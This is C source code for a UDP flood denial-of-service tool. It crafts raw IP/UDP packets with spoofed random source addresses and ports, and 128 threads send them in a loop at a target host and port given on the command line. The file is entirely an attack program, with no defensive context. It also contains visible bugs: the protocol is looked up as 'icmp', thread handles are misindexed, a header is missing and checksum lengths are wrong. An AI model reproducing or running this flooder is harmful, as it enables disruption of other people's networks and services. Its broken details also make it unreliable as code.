#include<stdio.h>
#include<string.h>
#include<ctype.h>
#include<unistd.h>
#include<fcntl.h>
#include<signal.h>
#include<sys/time.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netdb.h>
#include<errno.h>
#include<stdlib.h>
#include<time.h>
#include<netinet/ip.h>
#include<netinet/ip_icmp.h>
#include<netinet/udp.h>
#include<netinet/in.h>
#define MAXCHILD 128
static unsigned long dest=0;
static unsigned	short dest_port=0;
static unsigned long src=0;
static int PROTO_UDP=-1;
int rawsock;
static alive=-1;
struct protoent *protocol;

//define function 
//static unsigned short DoS_cksum(unsigned short *date,int length)

// function of random
 int myrandom(int begin,int end)
{
	int gap=end-begin+1;
	int ret=0;
	srand((unsigned)time(0));  
	ret=random()%gap+begin;
	return ret;
}

//CRC 16 check out
static unsigned short DoS_cksum(unsigned short *date,int length)
{
	register int left=length;
	register unsigned short *word=date;
	register int sum=0;
	unsigned short ret=0;
	while(left>1)
	{
		sum +=*word++;
		left -=2;
	}
	if(left==1){
		*(unsigned char *) (&ret)=*(unsigned char *) word;
		sum +=ret;
	}
	
	//折叠
	sum=(sum>>16)+(sum & 0xffff);
	sum +=(sum>>16);
	ret=~sum;
	return (ret);
}

static void Dos_udp()
{
	#define K 1024
	#define DATUML (3*K)
	int tot_len=sizeof(struct ip)+sizeof(struct udphdr)+DATUML;
	struct sockaddr_in to;
	struct dosseg_t
	{
		struct ip iph;
		struct udphdr udph;
		unsigned char date[65535];
	} dosseg;

	dosseg.iph.ip_v=4;
	dosseg.iph.ip_hl=5;
	dosseg.iph.ip_tos=0;
	dosseg.iph.ip_len=htons(tot_len);
	dosseg.iph.ip_id=htons(getpid());
	dosseg.iph.ip_off=0;
	dosseg.iph.ip_ttl=myrandom(200,255);
	dosseg.iph.ip_p=PROTO_UDP;
	dosseg.iph.ip_sum=0;
	dosseg.iph.ip_src.s_addr=(unsigned long)myrandom(0,65535);
	dosseg.iph.ip_dst.s_addr=dest;
	dosseg.iph.ip_sum=DoS_cksum((unsigned short *)&dosseg.iph,sizeof(dosseg.iph));
#ifdef __FAVOR_BSD

	dosseg.udph.uh_sport=(unsigned long) myrandom(0,65535);
	dosseg.udph.uh_dport=dest_port;
	dosseg.udph.uh_ulen=htons(sizeof(dosseg.udph)+DATUML);
	dosseg.udph.uh_sum=0;
	dosseg.udph.uh_sum=DoS_cksum((unsigned int *)&dosseg.udph,tot_len);
#else
	dosseg.udph.source=(unsigned long)myrandom(0,65535);
	dosseg.udph.dest=dest_port;
	dosseg.udph.len=htons(sizeof(dosseg.udph)+DATUML);
	dosseg.udph.check=0;
	dosseg.udph.check=DoS_cksum((unsigned short *)&dosseg.udph,tot_len);
#endif

	to.sin_family=AF_INET;
	to.sin_addr.s_addr=dest;
	to.sin_port=htons(0);

	// transform message
	sendto(rawsock,&dosseg,tot_len,0,(struct sockaddr *)&to,sizeof(struct sockaddr));
}

static void Dos_fun (unsigned long ip)
{
	while(alive){
		Dos_udp();
	}
}

//deal with signal 

static void Dos_sig(int signo)
{
	alive=0;
}

int main(int argc,char *argv[])
{
	struct hostent *host=NULL;
	struct protoent *protocal=NULL;
	char protoname[]="icmp";

	int i=0;
	pthread_t pthread[MAXCHILD];
	int err=-1;

	alive=1;
	//revieve signal CTRL+C
	signal(SIGINT,Dos_sig);

	if(argc<3){
		return -1;
	}

	protocol=getprotobyname(protoname);
	if(protocol==NULL){
		perror("getprotobyname");
		return -1;
	}
	PROTO_UDP=protocol->p_proto;
	dest=inet_addr(argv[1]);
	if(dest==INADDR_NONE){
		host=gethostbyname(argv[1]);
		if(host==NULL){
			perror("gethostbyname");
			return -1;
		}
		
		memcpy((char *)&dest,host->h_addr,host->h_length);
	}
	//port of destion
	dest_port=atoi(argv[2]);
	rawsock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW );
	if(rawsock<0){
		rawsock=socket(AF_INET,SOCK_RAW,PROTO_UDP);
 	}
	setsockopt(rawsock,SOL_IP,IP_HDRINCL,"1",sizeof("1"));

	for(i=0;i<MAXCHILD;i++){
		err=pthread_create(&pthread[1],NULL,Dos_fun,NULL);
	}

	for(i=0;i<MAXCHILD;i++){
		pthread_join(pthread[i],NULL);
	}

	close(rawsock);
	return 0;
}




















































 
